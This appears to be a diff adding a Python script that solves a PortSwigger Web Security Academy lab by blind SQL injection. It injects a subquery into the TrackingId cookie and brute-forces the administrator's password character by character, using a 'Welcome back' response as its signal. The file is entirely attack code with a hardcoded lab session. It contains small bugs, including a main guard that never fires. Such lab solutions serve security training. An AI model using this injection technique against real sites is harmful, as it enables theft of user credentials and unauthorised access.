@@ -1,0 +1,49 @@
+from pwn import *
+from termcolor import colored
+import requests
+import sys
+import signal
+import string
+import time
+
+def def_handler(sig, frame):
+    print(colored(f"\n[!] Saliendo... \n"),'red')
+    p1.failure("Ataque de fuerza fruta detenido")
+    sys.exit(1)
+
+# CTRL+C
+signal.signal(signal.SIGINT, def_handler)
+
+characters = string.ascii_lowercase + string.digits
+
+p1 = log.progress("SQLI")
+
+def makeSQLI():
+    
+    p1 = log.progress("SQLI")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    password = ""
+
+    p2 = log.progress("Password")
+
+    for position in range(1,21):
+        for character in characters:
+            cookies = {
+                    'TrackingId': f"LleB7aLqDQkf7H66' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",
+                    'session': "2D6pynjK7WDz3nlY8yTMv25EJpvxCqlk"      
+            }
+            
+            p1.status(cookies["TrackingId"])
+
+            r = requests.get("https://0ad0000904cd6a9c80cf8506003b0037.web-security-academy.net", cookies=cookies)
+
+            if "Welcome back" in r.text:
+                password += character
+                p2.status(password)
+                break
+
+if __name__ == 'main':
+    makeSQLI()
